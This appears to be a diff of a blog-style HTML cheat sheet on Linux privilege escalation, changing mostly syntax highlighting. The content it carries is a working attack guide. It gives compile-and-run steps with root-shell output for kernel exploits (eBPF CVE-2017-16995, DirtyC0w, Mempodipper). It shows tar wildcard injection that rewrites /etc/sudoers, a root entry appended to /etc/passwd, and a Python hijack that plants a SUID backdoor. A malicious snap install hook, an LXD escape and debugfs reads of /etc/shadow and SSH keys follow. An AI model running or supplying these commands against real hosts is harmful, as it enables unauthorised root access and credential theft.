@@ -290,7 +290,7 @@
   <li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linux-exploit-suggester.sh
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linux-exploit-suggester.sh
 </code></pre></div></div>
 
 <h2 id="compiling-exploits">Compiling Exploits</h2>
@@ -299,48 +299,48 @@
 
 <p>For <strong>64-bits:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c -o exploit
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c <span class="nt">-o</span> exploit
 </code></pre></div></div>
 
 <p>For <strong>32-bits:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -m32 exploit.c -o exploit
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-m32</span> exploit.c <span class="nt">-o</span> exploit
 
-#i686 and older devices
-gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit
+<span class="c">#i686 and older devices</span>
+gcc <span class="nt">-march</span><span class="o">=</span>i686 <span class="nt">-m32</span> <span class="nt">-Wl</span>,--hash-style<span class="o">=</span>both exploit.c <span class="nt">-o</span> exploit
 </code></pre></div></div>
 
 <p>Finally we just need to give execution permissions.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod u+x executablename
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>u+x executablename
 ./executablename
 </code></pre></div></div>
 
 <h2 id="ebpf_verifier---linux-kernel--4139">eBPF_verifier - Linux Kernel &lt; 4.13.9</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc cve-2017-16995.c -o cve-2017-16995
-$ chmod +x cve-2017-16995
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc cve-2017-16995.c <span class="nt">-o</span> cve-2017-16995
+<span class="nv">$ </span><span class="nb">chmod</span> +x cve-2017-16995
 
-$ ./cve-2017-16995
-[.]
-[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
-[.]
-[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
-[.]
-[*] creating bpf map
-[*] sneaking evil bpf past the verifier
-[*] creating socketpair()
-[*] attaching bpf backdoor to socket
-[*] skbuff =&gt; ffff88002dc42800
-[*] Leaking sock struct from ffff88003d00d400
-[*] Sock-&gt;sk_rcvtimeo at offset 472
-[*] Cred structure at ffff8800354a0600
-[*] UID from cred structure: 33, matches the current: 33
-[*] hammering cred structure at ffff8800354a0600
-[*] credentials patched, launching shell...
+<span class="nv">$ </span>./cve-2017-16995
+<span class="o">[</span>.]
+<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
+<span class="o">[</span>.]
+<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
+<span class="o">[</span>.]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff88002dc42800
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff88003d00d400
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 472
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8800354a0600
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 33, matches the current: 33
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8800354a0600
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
 
-# id
-uid=0(root) gid=0(root) groups=0(root),33(www-data)
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
 </code></pre></div></div>
 
 <ul>
@@ -349,12 +349,12 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 <h2 id="dirtyc0w---linux-kernel-2622--39">DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -pthread dirty.c -o dirty -lcrypt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
 </code></pre></div></div>
 
 <p>Transfer the exploit to the target machine.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x dirty
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x dirty
 ./dirty
 </code></pre></div></div>
 
@@ -364,30 +364,30 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 <h2 id="mempodipper---linux-kernel-2639--322-gentoo--ubuntu-x86x64">Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc mempodipper.c -o mempodipper
-$ chmod +x mempodipper
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc mempodipper.c <span class="nt">-o</span> mempodipper
+<span class="nv">$ </span><span class="nb">chmod</span> +x mempodipper
 
-$ ./mempodipper
-===============================
-=          Mempodipper        =
-=           by zx2c4          =
-=         Jan 21, 2012        =
-===============================
+<span class="nv">$ </span>./mempodipper
+<span class="o">===============================</span>
+<span class="o">=</span>          Mempodipper        <span class="o">=</span>
+<span class="o">=</span>           by zx2c4          <span class="o">=</span>
+<span class="o">=</span>         Jan 21, 2012        <span class="o">=</span>
+<span class="o">===============================</span>
 
-[+] Waiting for transferred fd in parent.
-[+] Executing child from child fork.
-[+] Opening parent mem /proc/1977/mem in child.
-[+] Sending fd 3 to parent.
-[+] Received fd at 5.
-[+] Assigning fd 5 to stderr.
-[+] Reading su for exit@plt.
-[+] Resolved exit@plt to 0x8049520.
-[+] Calculating su padding.
-[+] Seeking to offset 0x8049514.
-[+] Executing su with shellcode.
-# whoami
+<span class="o">[</span>+] Waiting <span class="k">for </span>transferred fd <span class="k">in </span>parent.
+<span class="o">[</span>+] Executing child from child fork.
+<span class="o">[</span>+] Opening parent mem /proc/1977/mem <span class="k">in </span>child.
+<span class="o">[</span>+] Sending fd 3 to parent.
+<span class="o">[</span>+] Received fd at 5.
+<span class="o">[</span>+] Assigning fd 5 to stderr.
+<span class="o">[</span>+] Reading su <span class="k">for </span><span class="nb">exit</span>@plt.
+<span class="o">[</span>+] Resolved <span class="nb">exit</span>@plt to 0x8049520.
+<span class="o">[</span>+] Calculating su padding.
+<span class="o">[</span>+] Seeking to offset 0x8049514.
+<span class="o">[</span>+] Executing su with shellcode.
+<span class="c"># whoami</span>
 root
-#
+<span class="c">#</span>
 </code></pre></div></div>
 
 <ul>
@@ -433,8 +433,8 @@ root
 
 <h2 id="finding-suid--guid-binaries"><strong>Finding SUID / GUID Binaries:</strong></h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2&gt;/dev/null
-find / -perm -g=s -type f 2&gt;/dev/null
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
 </code></pre></div></div>
 
 <h2 id="exploiting-path-variable">Exploiting PATH Variable</h2>
@@ -445,13 +445,13 @@ find / -perm -g=s -type f 2&gt;/dev/null
 
 <p>Let’s say we need an <strong>SUID binary</strong>. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. We can rewrite the <code class="highlighter-rouge">PATH</code> variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the <code class="highlighter-rouge">PATH</code> variable:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export PATH=/tmp
-echo $PATH
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp
+<span class="nb">echo</span> <span class="nv">$PATH</span>
 </code></pre></div></div>
 
 <p>And create a file with execution permissions with the same binary name:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "/bin/bash" &gt; /tmp/ps
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> /tmp/ps
 /bin/chmod +x /tmp/ps
 </code></pre></div></div>
 
@@ -483,14 +483,14 @@ echo $PATH
 
 <p>Imagine you compromise a low-level user on a system and you figure out this command is running as root:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /var/log/mon &amp;&amp; tar -zcf /tmp/mon.tar.gz *
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/log/mon <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-zcf</span> /tmp/mon.tar.gz <span class="k">*</span>
 </code></pre></div></div>
 
 <p>We want to go with <strong>sudoers</strong> <strong>file</strong> as we are lazy and just sudo bash, so let’s see….</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'echo "user ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; privesc.sh
-echo "" &gt; "--checkpoint-action=exec=sh privesc.sh"
-echo "" &gt; --checkpoint=1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'echo "user ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> <span class="o">&gt;</span> privesc.sh
+<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh privesc.sh"</span>
+<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
 </code></pre></div></div>
 
 <h1 id="writeable-etcpasswd">Writeable /etc/passwd</h1>
@@ -499,18 +499,18 @@ echo "" &gt; --checkpoint=1
 
 <p>if we have a writable <code class="highlighter-rouge">/etc/passwd</code> file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd -1 -salt [username] [password]
-openssl passwd [password]
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> <span class="o">[</span>username] <span class="o">[</span>password]
+openssl passwd <span class="o">[</span>password]
 </code></pre></div></div>
 
 <p>Finally append the following string to <code class="highlighter-rouge">/etc/passwd</code> file:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[USERNAME]:[HASH]:0:0:root:/root:/bin/bash
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>USERNAME]:[HASH]:0:0:root:/root:/bin/bash
 </code></pre></div></div>
 
 <p>And finally su to this new user to obtain a <strong>root</strong> <strong>shell</strong>:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su [USERNAME]
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su <span class="o">[</span>USERNAME]
 </code></pre></div></div>
 
 <h1 id="gtfobins">GTFOBins</h1>
@@ -519,7 +519,7 @@ openssl passwd [password]
 
 <p>Firstly, we need to check the sudo permissions on binaries:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
 </code></pre></div></div>
 
 <p>After that search on <a href="https://gtfobins.github.io">GTOBins web </a>to search how to escape from that binary and obtain a shell:</p>
@@ -528,8 +528,8 @@ openssl passwd [password]
   <li><a href="https://gtfobins.github.io">https://gtfobins.github.io/</a></li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
-    (root) NOPASSWD: /usr/bin/someBinary
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/someBinary
 </code></pre></div></div>
 
 <blockquote>
@@ -540,37 +540,37 @@ openssl passwd [password]
 
 <p>This mean that we can set some environment variables to run the command.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on admirer:
-    (ALL) SETENV: /opt/scripts/some.py
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on admirer:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: /opt/scripts/some.py
 </code></pre></div></div>
 
 <p>Search for a library, create a copy in <code class="highlighter-rouge">/tmp</code> and execute commands.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>some.py
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">some</span><span class="o">.</span><span class="n">py</span>
 
-import sys
-sys.exit(10)
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>We can create a sys.py file on <code class="highlighter-rouge">/tmp</code>.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
-def exit(a):
-        os.system("cp /bin/bash /tmp/rev")
-        os.system("chmod u+s /tmp/rev")
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">def</span> <span class="nf">exit</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"cp /bin/bash /tmp/rev"</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod u+s /tmp/rev"</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Finally open the backdoor.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rev -p
-rev-4.4# id
-uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rev <span class="nt">-p</span>
+rev-4.4# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
 </code></pre></div></div>
 
 <h2 id="snap-install">Snap install</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
-    (root) NOPASSWD: /usr/bin/snap install *
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User user may run the following commands on armageddon:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
 </code></pre></div></div>
 
 <p>When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet.</p>
@@ -580,321 +580,338 @@ uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
   <li><a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir privesnap
-cd privesnap
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>privesnap
+<span class="nb">cd </span>privesnap
 snapcraft init
 
-touch snap/hooks/install
+<span class="nb">touch </span>snap/hooks/install
 </code></pre></div></div>
 
 <p>We need to create a malicious <code class="highlighter-rouge">snap/hooks/install</code> file, and modify <code class="highlighter-rouge">snap/snapcraft.yaml</code></p>
 
 <ul>
-  <li>install
-```
-#!/bin/bash</li>
+  <li>install</li>
 </ul>
 
-<h1 id="dirty_sockdirty_sock">dirty_sock:dirty_sock</h1>
-<p>useradd dirty_sock -m -p ‘$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.’ -s /bin/bash
-usermod -aG sudo dirty_sock
-echo “dirty_sock    ALL=(ALL:ALL) ALL” » /etc/sudoers</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* snapcraft.yaml
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c"># dirty_sock:dirty_sock</span>
+useradd dirty_sock <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.'</span> <span class="nt">-s</span> /bin/bash
+usermod <span class="nt">-aG</span> <span class="nb">sudo </span>dirty_sock
+<span class="nb">echo</span> <span class="s2">"dirty_sock    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
 </code></pre></div></div>
-<p>name: privesnap
-version: ‘0.1’ 
-summary: Empty snap, used for exploit
+<ul>
+  <li>snapcraft.yaml</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>name: privesnap
+version: <span class="s1">'0.1'</span> 
+summary: Empty snap, used <span class="k">for </span>exploit
 description: |
-    See https://github.com/initstring/dirty_sock</p>
+    See https://github.com/initstring/dirty_sock
 
-<p>grade: devel
-confinement: devmode</p>
+grade: devel
+confinement: devmode
 
-<p>parts:
+parts:
   my-part:
-    plugin: nil</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-# Linux Capabilities
-
-&gt; Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
-
+    plugin: nil
 </code></pre></div></div>
-<p>getcap -r / 2&gt;/dev/null</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Check the following link to see what means each capability:
 
-* [https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.](https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.)
+<h1 id="linux-capabilities">Linux Capabilities</h1>
 
-&gt; Note: **`ep`** capability means that can read and write any file on the filesystem.
+<blockquote>
+  <p>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</p>
+</blockquote>
 
-More info in:
-
-* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
-
-# Exploiting Crontab
-
-The `Cron` daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.
-
-**To view what cronjobs are active** we need to cat the `/etc/crontab` file:
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap <span class="nt">-r</span> / 2&gt;/dev/null
 </code></pre></div></div>
-<p>cat /etc/crontab</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.
 
-# Abusing privileges (Group memberships)
+<p>Check the following link to see what means each capability:</p>
 
-## sudo
+<ul>
+  <li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.">https://man7.org/linux/man-pages/man7/capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute.</a></li>
+</ul>
 
-Thats it, you're already root:
+<blockquote>
+  <p>Note: <strong><code class="highlighter-rouge">ep</code></strong> capability means that can read and write any file on the filesystem.</p>
+</blockquote>
 
+<p>More info in:</p>
+
+<ul>
+  <li><a href="https://linux-audit.com/linux-capabilities-101/">https://linux-audit.com/linux-capabilities-101/</a></li>
+</ul>
+
+<h1 id="exploiting-crontab">Exploiting Crontab</h1>
+
+<p>The <code class="highlighter-rouge">Cron</code> daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks.</p>
+
+<p><strong>To view what cronjobs are active</strong> we need to cat the <code class="highlighter-rouge">/etc/crontab</code> file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
 </code></pre></div></div>
-<p>sudo su -</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## lxd
 
-A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.
+<p>If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task.</p>
 
-### With Internet
+<h1 id="abusing-privileges-group-memberships">Abusing privileges (Group memberships)</h1>
 
+<h2 id="sudo">sudo</h2>
+
+<p>Thats it, you’re already root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
 </code></pre></div></div>
-<p>lxc init ubuntu:16:04 myimage -c security.privileged=true
-lxc config device add myimage whatever disk source=/ path=/mnt/root recursive=true
-lxc start test
-lxc exec test bash</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-### Without Internet
 
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
+<h2 id="lxd">lxd</h2>
 
+<p>A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>
+
+<h3 id="with-internet">With Internet</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init ubuntu:16:04 myimage <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>lxc config device add myimage whatever disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>lxc start <span class="nb">test
+</span>lxc <span class="nb">exec test </span>bash
 </code></pre></div></div>
-<h1 id="build-a-simple-alpine-image">build a simple alpine image</h1>
-<p>git clone https://github.com/saghul/lxd-alpine-builder
-cd lxd-alpine-builder
-sed -i ‘s,yaml_path=”latest-stable/releases/$apk_arch/latest-releases.yaml”,yaml_path=”v3.8/releases/$apk_arch/latest-releases.yaml”,’ build-alpine
-sudo ./build-alpine -a i686</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Also you can download directly the image from ubuntu:
 
+<h3 id="without-internet">Without Internet</h3>
+
+<p>Build an Alpine image and start it using the flag <code class="highlighter-rouge">security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># build a simple alpine image</span>
+git clone https://github.com/saghul/lxd-alpine-builder
+<span class="nb">cd </span>lxd-alpine-builder
+<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",'</span> build-alpine
+<span class="nb">sudo</span> ./build-alpine <span class="nt">-a</span> i686
 </code></pre></div></div>
-<p>wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
+
+<p>Also you can download directly the image from ubuntu:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
 wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
-And exploit it:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+And exploit it:
 </code></pre></div></div>
-<h1 id="import-the-image">import the image</h1>
-<p>lxc image import ./alpine<em>.tar.gz –alias myimage # It’s important doing this from YOUR HOME directory on the victim machine, or it might fail.
-lxc image import xenial-server-cloudimg-amd64-</em>.tar.xz –alias myimage # Or this depending if you downloaded</p>
 
-<h1 id="before-running-the-image-start-and-configure-the-lxd-storage-pool-as-default">before running the image, start and configure the lxd storage pool as default</h1>
-<p>lxd init</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># import the image</span>
+lxc image import ./alpine<span class="k">*</span>.tar.gz <span class="nt">--alias</span> myimage <span class="c"># It's important doing this from YOUR HOME directory on the victim machine, or it might fail.</span>
+lxc image import xenial-server-cloudimg-amd64-<span class="k">*</span>.tar.xz <span class="nt">--alias</span> myimage <span class="c"># Or this depending if you downloaded</span>
 
-<h1 id="run-the-image">run the image</h1>
-<p>lxc init myimage mycontainer -c security.privileged=true</p>
+<span class="c"># before running the image, start and configure the lxd storage pool as default </span>
+lxd init
 
-<h1 id="mount-the-root-into-the-image">mount the /root into the image</h1>
-<p>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</p>
+<span class="c"># run the image</span>
+lxc init myimage mycontainer <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
 
-<h1 id="interact-with-the-container">interact with the container</h1>
-<p>lxc start mycontainer
-lxc exec mycontainer /bin/sh</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## adm
+<span class="c"># mount the /root into the image</span>
+lxc config device add mycontainer mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
 
-All members of the group `admin` have access to logs files:
-
+<span class="c"># interact with the container</span>
+lxc start mycontainer
+lxc <span class="nb">exec </span>mycontainer /bin/sh
 </code></pre></div></div>
-<p>/var/log/</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-## disk
 
-All members of the gorup `disk` have full access to the filesystem.
+<h2 id="adm">adm</h2>
 
+<p>All members of the group <code class="highlighter-rouge">admin</code> have access to logs files:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/
 </code></pre></div></div>
-<p>df -h #search disk</p>
 
-<p>debugfs /dev/sda1
-debugfs: cd /root
-debugfs: cat /root/.ssh/id_rsa
-debugfs: cat /etc/shadow</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-We can also write files on the filesystem.
+<h2 id="disk">disk</h2>
 
+<p>All members of the gorup <code class="highlighter-rouge">disk</code> have full access to the filesystem.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">df</span> <span class="nt">-h</span> <span class="c">#search disk</span>
+
+debugfs /dev/sda1
+debugfs: <span class="nb">cd</span> /root
+debugfs: <span class="nb">cat</span> /root/.ssh/id_rsa
+debugfs: <span class="nb">cat</span> /etc/shadow
 </code></pre></div></div>
-<p>debugfs -w /dev/sda1
-debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-&gt; **Hint**: Files owned by root are now writable such as `/etc/passwd` or `/etc/shadow`.
 
-## video
+<p>We can also write files on the filesystem.</p>
 
-The video group has access to view the screen output of all opened sessions (tty). With `w` command we can see the who is logged on the server:
-
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugfs <span class="nt">-w</span> /dev/sda1
+debugfs: dump file1.txt file2.txt  <span class="c">#Copy file1.txt to file2.txt</span>
 </code></pre></div></div>
-<p>moshe@falafel:/var/log$ w
- 17:35:42 up  3:40,  3 users,  load average: 0.22, 0.09, 0.08
+
+<blockquote>
